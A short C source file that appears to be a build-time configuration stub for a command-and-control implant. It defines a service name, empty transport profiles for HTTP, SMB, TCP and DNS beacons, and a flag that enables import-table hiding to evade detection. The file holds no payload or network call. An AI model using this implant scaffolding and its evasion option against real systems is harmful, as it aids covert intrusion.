#include "config.h"

#if defined(BUILD_SVC)
char* getServiceName()
{
	return (char*) "ServiceName";
}
#endif

#if defined(BEACON_HTTP) 
char* getProfile()
{
	return (char*)"";
}

unsigned int getProfileSize()
{
	return 1;
}

#elif defined(BEACON_SMB) 

char* getProfile()
{
	return (char*)"";
}

unsigned int getProfileSize()
{
	return 1;
}

#elif defined(BEACON_TCP) 

char* getProfile()
{
	return (char*)"";
}

unsigned int getProfileSize()
{
	return 1;
}

#elif defined(BEACON_DNS) 

char* getProfile()
{
	return (char*)"";
}

unsigned int getProfileSize()
{
	return 1;
}

#endif

int isIatHidingEnabled()
{
	return 1;
}